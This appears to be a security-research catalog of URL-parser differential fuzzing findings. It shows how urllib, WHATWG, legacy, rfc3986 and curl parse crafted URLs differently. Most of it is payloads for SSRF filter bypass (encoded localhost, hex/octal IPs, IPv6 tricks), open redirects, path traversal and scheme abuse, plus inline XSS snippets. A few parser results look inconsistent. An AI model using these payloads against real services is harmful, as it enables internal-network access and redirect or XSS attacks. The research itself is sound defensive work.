# URL Parser Differential Fuzzing: Payload Catalog

> **Session**: S57 (Multi-finding Oracle) | 553 unique findings | 2026-02-23
> **Parsers**: urllib (primary) vs WHATWG, legacy, rfc3986, curl

이 문서는 S57에서 발견된 553개의 payload를 카테고리별로 분류하고, 각 파서가 어떻게 다르게 해석하는지를 실제 예시와 함께 보여준다.

---

## 1. SSRF Host Confusion (35 CRITICAL)

파서 A는 외부 호스트로, 파서 B는 내부 IP로 해석. **직접적인 SSRF 바이패스.**

### 1.1 Percent-Encoded Localhost

```
http://%6c%6f%63%61%6c%68%6f%73%74/admin
```
| Parser | Host |
|--------|------|
| **urllib** | `%6c%6f%63%61%6c%68%6f%73%74` (인코딩 그대로) |
| **WHATWG** | `localhost` (디코딩됨 → 내부 IP) |

> **공격**: urllib로 SSRF 차단 목록 검사 → WHATWG/브라우저로 fetch → localhost 접근

### 1.2 Hex IP with Percent-Encoded Dots

```
http://0x7f%2e0%2e0%2e1/%2e%2e
```
| Parser | Host |
|--------|------|
| **urllib** | `0x7f%2e0%2e0%2e1` (문자열) |
| **WHATWG** | `127.0.0.1` (디코딩 + hex 정규화) |

> **공격**: 이중 우회 — 인코딩 + hex IP. WAF 탐지 극도로 어려움

### 1.3 Double-Bracket IPv6

```
http://[[::1]]/path
```
| Parser | Host |
|--------|------|
| **urllib** | `[::1` (첫 `]`에서 파싱 종료, 유효하지 않은 호스트) |
| **legacy** | `[::1]` (올바른 IPv6 루프백) |

> **공격**: 차단 목록에 `[::1`은 없음. legacy 파서가 실제 요청 시 `[::1]`으로 해석

### 1.4 Octal IP + Scheme Confusion

```
telnet://0177000000javascript:rz[1]=niknyofwdj%E0%80%AFc%23//fulxnauf.com.br/..%c0%af
```
| Parser | Host |
|--------|------|
| **urllib** | `1` (파싱 혼란) |
| **legacy** | `0177000000javascript` → `127.0.0.1` (octal 정규화) |

> **공격**: 비-HTTP 스킴 + octal IP + path traversal 삼중 우회

### 1.5 Backslash + IPv6 Mapped

```
http://evil.com\‌od.[::ffff:7f00:1]com/path／
```
| Parser | Host |
|--------|------|
| **urllib** | `::ffff:7f00:1` (IPv6-mapped 127.0.0.1) |
| **WHATWG** | `evil.com` (backslash를 path separator로 처리) |

> **공격**: IPv6-mapped IPv4 형식으로 내부 접근. 방향이 반대 — urllib이 내부, WHATWG가 외부

### 1.6 NULL Byte Host Truncation

```
http://good.com%00.evil.com/path
```
| Parser | Host |
|--------|------|
| **urllib** | `good.com%00.evil.com` (전체 문자열) |
| **legacy** | `good.com` (NULL에서 절단) |

> **공격**: good.com이 allowlist에 있으면 urllib 검증 통과. legacy 실행 시 good.com만 접근

### 1.7 Incomplete IP Auto-Completion

```
http://127.0/.0.1#@evil.com
```
| Parser | Host |
|--------|------|
| **urllib** | `127.0` (불완전) |
| **WHATWG** | `127.0.0.0` (자동 완성) |

> **공격**: 0.0.0.0 대역으로 자동 완성. 차단 목록에 `127.0`은 없음

### 1.8 Localhost Unicode Escape

```
http://localhos\u0074/admin
```
| Parser | Host |
|--------|------|
| **urllib** | `localhos\u0074` (escape 미해석) |
| **WHATWG** | `localhos` (backslash에서 절단) |

> **공격**: 어느 쪽이든 기대와 다른 호스트. 검증 로직 혼란

### 1.9 Bracket + Hex IP

```
http://0x#%40127<http://[::1]math><annotation-xm
```
| Parser | Host |
|--------|------|
| **urllib** | `0x` |
| **WHATWG** | `0.0.0.0` (0x를 hex 0으로 해석 → 0.0.0.0) |

### 1.10 Telnet Backslash Authority

```
telnet://localhost:\@jth.co.uk/..%c0%af
```
| Parser | Host |
|--------|------|
| **urllib** | `jth.co.uk` (backslash 이후를 host로) |
| **legacy** | `localhost` (backslash를 path separator로) |

> **공격**: 비-HTTP 스킴에서 SSRF 필터 우회

### More SSRF Variants

```
resource://bwr.co.kr\@127.0.0.1/xqo;
  urllib: host="127.0.0.1" | legacy: host="bwr.co.kr"

moz-extension://[[127.0.0.1]]:080/..;
  urllib: host="[127.0.0.1" | legacy: host="[127.0.0.1]"

blob://[0000:0000:0000:0000:0000:0000:0000:0001]t0001]/tte.xte.xml
  urllib: host="0000:...:0001" | legacy: host="0000:...:0001]t0001"

javascript://127.0.0.1%00.[xqlcrqtoh.com]/fbfytyspv;.css
  urllib: host="xqlcrqtoh.com" | rfc3986: host="127.0.0.1%00.[xqlcrqtoh.com]"

http://a%..\40b@127.0.0.1/..;
  urllib: host="127.0.0.1" | legacy: host="a"
```

---

## 2. Open Redirect (74 HIGH)

파서 간 host 해석이 달라 공격자 도메인으로 redirect 가능.

### 2.1 Backslash Authority (대표 벡터)

```
http://evil.com\@good.com/path
```
| Parser | Host |
|--------|------|
| **urllib** | `good.com` (backslash를 userinfo 구분자로) |
| **WHATWG** | `evil.com` (backslash를 `/`로 변환) |

> **공격**: urllib 검증 = good.com (안전) → WHATWG fetch = evil.com (공격자)

### 2.2 NULL Byte + HTML Injection

```
http://good.com%00.evil.com:80//<a id="x" name="y" href="javascript:alert(1)">
```
| Parser | Host |
|--------|------|
| **urllib** | `good.com%00.evil.com` |
| **legacy** | `good.com` (NULL 절단) |

### 2.3 Fullwidth Dot (Unicode)

```
http://evil。com/path
```
| Parser | Host |
|--------|------|
| **urllib** | `evil。com` (fullwidth dot 미변환) |
| **WHATWG** | `evil.com` (Unicode 정규화) |

### 2.4 Hex IP Normalization

```
HTTP://0x7f000001/%2e%2e/.%00.
```
| Parser | Host |
|--------|------|
| **urllib** | `0x7f000001` |
| **WHATWG** | `127.0.0.1` |

```
//0x7f.0x0.0x0.0x1:00443/path#fragment
```
| Parser | Host |
|--------|------|
| **urllib** | `0x7f.0x0.0x0.0x1` |
| **WHATWG** | `127.0.0.1` |

### 2.5 Octal IP Partial

```
http://017#:800 .1/admin
```
| Parser | Host |
|--------|------|
| **urllib** | `017` |
| **WHATWG** | `0.0.0.15` (octal 017 = 15) |

### 2.6 Tab/CR/LF in Host

```
http://ev\til.c\r\nom/path
```
| Parser | Host |
|--------|------|
| **urllib** | `evil.com` (탭/CR/LF 제거) |
| **rfc3986** | `ev\til.c\r\nom` (제어문자 보존) |

### 2.7 IPv6 Bracket Mismatch

```
http://[::1]:80/admin
```
| Parser | Host |
|--------|------|
| **urllib** | `::1` (괄호 제거) |
| **WHATWG** | `[::1]` (괄호 보존) |

### More Open Redirect Variants

```
http://evil.com\@go?#od.com/path
  urllib: host="go" | WHATWG: host="evil.com"

http://evil.com\@go?key=val;extraod.com/path
  urllib: host="go" | WHATWG: host="evil.com"

htp://evil.com\@good.com/path
  urllib: host="good.com" | legacy: host="evil.com"

http://good.<ma?key=%26extra=1th><mo>com:0x50/path
  urllib: host="good.<ma" | legacy: host="good."

http://good.com<svg/onload=alert(1)>%00.evil.com:80//...
  urllib: host="good.com<svg" | legacy: host="good.com"
```

---

## 3. Path Traversal (65 HIGH)

`..` 정규화 방식 차이로 디렉토리 탈출.

### 3.1 Backslash Path Traversal

```
http://good.com/..\..\evil.com
```
| Parser | Path |
|--------|------|
| **urllib** | `/..\..\evil.com` (backslash 미변환) |
| **WHATWG** | `/evil.com` (backslash→slash 후 `..` 정규화) |

> **공격**: nginx(urllib 기반) → Node.js(WHATWG) 프록시에서 path ACL 우회

### 3.2 Semicolon Path Parameter

```
http://127.0.0.256/..;alozbllxb[8]=%20=null
```
| Parser | Path |
|--------|------|
| **urllib** | `/..` (`;` 이후 제거) |
| **legacy** | `/..;alozbllxb[8]=%20=null` (전체 보존) |

> **공격**: Java Servlet/Tomcat의 path parameter(`;jsessionid=...`) 처리와 유사

### 3.3 Double Percent-Encoding

```
content://[vf.zvdfxkscl]/admin;/../secret/..%2fbtwaa%GGfb
```
| Parser | Path |
|--------|------|
| **urllib** | `/admin;/../secret/..%2fbtwaa%GGfb` |
| **rfc3986** | `/admin;/../secret/..%252fbtwaa%25GGfb` (재인코딩) |

### 3.4 Percent-Encoded Dot Traversal

```
kgdy://[::1]:@localhost./%2e%2e
```
| Parser | Path |
|--------|------|
| **urllib** | `/%2e%2e` (미디코딩 — traversal 아님) |
| **WHATWG** | `/` (디코딩 후 `..` 정규화 → root) |

### 3.5 UTF-8 Overlong Dot

```
%0ahttp://localhost/..%e0%80%af
```
| Parser | Path |
|--------|------|
| **urllib** | `%0ahttp://localhost/..%e0%80%af` (전체가 path) |
| **WHATWG** | `/%0ahttp://localhost/..%e0%80%af` |

### More Path Traversal Variants

```
http:/dmin;/../secret/apuccglbs.xml
  urllib: path="/dmin;/../secret/..." | WHATWG: path="/secret/..." (정규화)

//hwwqyl.co.jp/..;
  urllib: path="/.." | WHATWG: path="/..;"

about://[v1...]:0/..%efile://0%80%:65536af
  urllib: path="/..%efile://0%80%:65536af"
  rfc3986: path="/..%25efile://0%2580%25:65536af"

9blob:/&quot;/[:9999/.*1>:99999/..%ef%bc%8f
  urllib: path="/&quot;/[:9999/.*1>:99999/..%ef%bc%8f"
  rfc3986: path="9blob:/&quot;/[:9999/.*1%3E:99999/..%ef%bc%8f"
```

---

## 4. Path Confusion (45 MEDIUM)

`..` 정규화가 아닌, path 자체의 해석 차이.

### 4.1 Backslash를 Scheme으로 vs Path로

```
ht\ttp://evil.com/
```
| Parser | Path |
|--------|------|
| **urllib** | `/` (정상 파싱) |
| **legacy** | `ht%09tp://evil.com/` (전체가 path) |

### 4.2 Triple-Slash Authority

```
http:///evil.com/path
```
| Parser | Path |
|--------|------|
| **urllib** | `/evil.com/path` (host 없음, 전체가 path) |
| **WHATWG** | `/path` (evil.com을 host로 인식) |

### 4.3 Semicolon Path Parameter

```
http://good.com/path;key=val?q=1
```
| Parser | Path |
|--------|------|
| **urllib** | `/path` (`;` 이후 제거) |
| **WHATWG** | `/path;key=val` (전체 보존) |

> **공격**: Java/Tomcat의 path parameter 처리 차이. ACL이 `/path`만 허용하면 `;key=val` 부분으로 다른 동작 유도 가능

### 4.4 Protocol-Relative URL

```
//evil.com/path
```
| Parser | Path |
|--------|------|
| **urllib** | `/path` (evil.com을 host로) |
| **legacy** | `//evil.com/path` (전체가 path) |

### 4.5 Backslash Path Normalization

```
\/dfzphiqa.net/fzzxfm.html
```
| Parser | Path |
|--------|------|
| **urllib** | `\/dfzphiqa.net/fzzxfm.html` (전체가 path) |
| **WHATWG** | `/fzzxfm.html` (backslash→slash, host=dfzphiqa.net) |

### More Path Confusion Variants

```
http: xmlns="http://www.?\\<b><i></b></i>
  urllib: path='xmlns="http://www.' | WHATWG: path='/ xmlns=...'

httPs:/%p/evil.co'"><m/pa%00th
  urllib: path="/%p/evil.co..." | rfc3986: path="/%25p/evil.co..."

//hwwqyl.co.jp/zfmamgo;.js
  urllib: path="/zfmamgo" | WHATWG: path="/zfmamgo;.js"

http:dict:////goo?key=val;extrad.com%00.evil.com:80//...
  urllib: path="dict:////goo" | WHATWG: path="////goo"
```

---

## 5. Fragment Confusion (36 LOW~MEDIUM)

Fragment(`#` 이후) 인코딩/해석 차이.

### 5.1 Percent-Encoding 차이

```
http:/#%2f%2fevil.com/go\/.com:080/path<select><svg>
```
| Parser | Fragment |
|--------|----------|
| **urllib** | `%2f%2fevil.com/go\/.com:080/path<select><svg>` |
| **WHATWG** | `%2f%2fevil.com/go/.com:080/path%3Cselect%3E%3Csvg%3E` |

> **공격**: SPA에서 fragment를 라우팅에 사용하면, 인코딩 차이로 다른 페이지 접근 가능

### 5.2 NULL Byte + Fragment

```
ht\ttp://##dl.com/%25252f#%41...
```
| Parser | Fragment |
|--------|----------|
| **urllib** | `#dl.com/%25252f#%41...` (첫 `#` 이후 전체) |
| **legacy** | `%41...` (두 번째 `#` 이후) |

### 5.3 Fragment 경계 혼란

```
http:?\\evil.com//evil.%00.com\@go?#od.com/pathconstructor.
```
| Parser | Fragment |
|--------|----------|
| **urllib** | `od.com/pathconstructor.` |
| **rfc3986** | 다른 위치에서 `#` 인식 |

---

## 6. Port Confusion (34 MEDIUM)

Port 해석/정규화 차이.

### 6.1 Leading Zero

```
http://good.com:080/path
```
| Parser | Port |
|--------|------|
| **urllib** | `080` (문자열 그대로) |
| **WHATWG** | `` (80은 default → 생략) |

```
ftps://0.0.0.0:0000080/..%5c
```
| Parser | Port |
|--------|------|
| **urllib** | `80` (int 변환) |
| **legacy** | `0000080` (문자열 보존) |

### 6.2 Hex Port

```
http://good.com:0x50/path
```
| Parser | Port |
|--------|------|
| **urllib** | `0x50` (문자열) |
| **legacy** | `` (hex 인식 실패 → 기본 포트) |

> **공격**: 0x50 = 80. urllib은 "포트 0x50"으로 판단(비표준), legacy는 "기본 포트 80"으로 판단

### 6.3 Default Port Stripping

```
http://[::1]:80/admin
```
| Parser | Port |
|--------|------|
| **urllib** | `80` (명시적 보존) |
| **WHATWG** | `` (80은 HTTP 기본 → 제거) |

> **공격**: 포트 기반 ACL에서 "포트 80"과 "포트 없음"이 다르게 처리되는 경우

### 6.4 Large/Overflow Port

```
http://good.com:08080/path
```
| Parser | Port |
|--------|------|
| **urllib** | `8080` |
| **legacy** | `08080` |

### More Port Variants

```
http://good.com:08? key0/@@th# @
  urllib: port="8" | legacy: port="08"

wss://53.222.24.119.nip.io:0000080/..%2fququ;jsessionid=
  urllib: port="80" | legacy: port="0000080"

https:oa:80\gp.ozj%e
  urllib: port="" | WHATWG: port="80" (다른 컴포넌트에서)

http://evil.com\@:0000080/path
  urllib: port="0000080" | WHATWG: port="" (default)
```

---

## 7. Authority/Userinfo Confusion (31 HIGH)

`@` 기호 해석 차이로 인한 userinfo/host 경계 혼란.

### 7.1 Mailto Userinfo

```
mailto:user@evil.com?subject=test
```
| Parser | Interpretation |
|--------|---------------|
| **urllib** | path=`user@evil.com`, query=`subject=test` |
| **legacy** | host=`evil.com`, userinfo=`user` |

### 7.2 Double @ Authority

```
http://user@evil.com@good.com/path
```
| Parser | Host |
|--------|------|
| **urllib** | `good.com` (마지막 @) |
| **WHATWG** | `evil.com` (첫 @) |

### 7.3 Encoded @ in Host

```
http://a%40b@127.0.0.1/..;
```
| Parser | Host |
|--------|------|
| **urllib** | `127.0.0.1` |
| **legacy** | `a` (%40 = @, 다른 위치에서 분리) |

### 7.4 Backslash + @ Combination

```
http://evil.com\@go?key=val;extraod.com/path
```
| Parser | Userinfo | Host |
|--------|----------|------|
| **urllib** | `evil.com\` | `go` |
| **WHATWG** | `` | `evil.com` |

### 7.5 Colon + Backslash in Authority

```
http://:.il.co \@go?#od.com/path
```
| Parser | Interpretation |
|--------|---------------|
| **urllib** | userinfo=`:.il.co \`, host=`go` |
| **legacy** | host=`:.il.co` |

### More Authority Variants

```
HTTP:user:pass@//0x7f000001/%:...
  urllib: userinfo="" | legacy: userinfo="user:pass"

///zbicwtpih.c@o.k127.0.0.1%23@evil.comr
  urllib: host="evil.comr" | WHATWG: host="o.k127.0.0.1%23"

http:/evil.com@127.0.0.1evil.com\?\\evi
  urllib: host="127.0.0.1evil.com" | WHATWG: host="evil.com"

ht\tta://dEi 127.0.0.1:80@evil.com ...
  urllib: host="evil.com" | legacy: host="dEi"
```

---

## 8. Query Confusion (27 MEDIUM)

Query string 인코딩/경계 차이.

### 8.1 Redirect Parameter

```
http://a?next=http://localhost%40b@127.0.0.1/..;
```
| Parser | Query |
|--------|-------|
| **urllib** | `next=http://localhost%40b@127.0.0.1/..;` |
| **legacy** | `next=http://localhost%2540b@127.0.0.1/..;` (재인코딩) |

> **공격**: OAuth callback의 redirect_uri 파라미터에서 인코딩 차이로 검증 우회

### 8.2 Special Characters in Query

```
http:?\\evil.com//evil.%00.com\@go?#od.com/path
```
| Parser | Query |
|--------|-------|
| **urllib** | `\\evil.com//evil.%00.com\@go` |
| **rfc3986** | `%5C%5Cevil.com//evil.%2500.com%5C@go` |

### 8.3 Null Byte in Query Boundary

```
//hwwqyl.co.?%00jp/zfmamgo;" OR ""="...
```
| Parser | Query |
|--------|-------|
| **urllib** | `%00jp/zfmamgo;" OR ""="...` |
| **legacy** | `%2500jp/zfmamgo;...` (재인코딩) |

---

## 9. Scheme Confusion (13 HIGH)

### 9.1 XSS Scheme Bypass

```
data://good.com/text/html,payload
data://[v7.jxdmvmdwzbaup]/admin;/../secret/.
```
| Parser | Behavior |
|--------|----------|
| **urllib** | Accept (scheme=`data`) |
| **WHATWG/curl** | Reject |

> **공격**: data: URL을 허용하는 파서를 통과하면 XSS payload 실행 가능

### 9.2 VBScript Scheme

```
vbscript://::ffff:127.0.0.1/qbywuhtporgjm
```
| Parser | Behavior |
|--------|----------|
| **urllib** | Reject |
| **legacy** | Accept |

### 9.3 File Scheme (UNC Path)

```
file://evil.com/share/payload
```
| Parser | Behavior |
|--------|----------|
| **urllib** | Accept |
| **curl** | Reject |

> **공격**: file:// 스킴으로 로컬 파일 또는 UNC 경로 접근

### 9.4 Non-Standard Schemes

```
ldaps://::ffff:127.0.0.1/.%00.
dict://[v6.zzzersjikw]/....//%0d%0aHost:%20127.0.0.1
gopher://[100.209.240.74.dev]:-1/dwabacsc;.js
```

> **공격**: SSRF 필터가 http/https만 검사하면 gopher/dict/ldaps로 내부 서비스 접근

---

## 10. SSRF Accept/Reject (6 HIGH)

한쪽은 URL을 수용, 다른 쪽은 거부 — 검증과 실행의 불일치.

```
http://127.0.0.1#@evil.com/         → urllib: accept, curl: reject
http://[127.0.0.1]/admin            → urllib: accept, WHATWG: reject
ftps://127.0.0.1:-1/%E0%80%AE       → urllib: reject, legacy: accept
jar://[::1]:+80/..%2fEpv8gOvbCCb    → urllib: reject, rfc3986: accept
httP://user:pass%4`word@127.0.0.1/  → urllib: accept, legacy: reject
```

> **공격**: "파서 A가 거부하면 안전"이라는 가정이 깨짐. 실제 요청 파서가 수용할 수 있음.

---

## Summary Statistics

| Category | Count | Severity | Key Parser Pair |
|----------|-------|----------|-----------------|
| SSRF Host Confusion | 35 | CRITICAL | urllib↔WHATWG, urllib↔legacy |
| Open Redirect | 74 | HIGH | urllib↔WHATWG |
| Path Traversal | 65 | HIGH | urllib↔WHATWG, urllib↔legacy |
| Path Confusion | 45 | MEDIUM | urllib↔legacy, urllib↔WHATWG |
| Fragment Confusion | 36 | LOW~MED | urllib↔rfc3986 |
| Port Confusion | 34 | MEDIUM | urllib↔WHATWG, urllib↔legacy |
| Authority Confusion | 31 | HIGH | urllib↔legacy |
| Query Confusion | 27 | MEDIUM | urllib↔rfc3986, urllib↔legacy |
| Scheme Confusion | 13 | HIGH | urllib↔legacy, urllib↔curl |
| SSRF Accept/Reject | 6 | HIGH | All pairs |
| **Total** | **366** | | (+ 187 uncategorized = 553) |
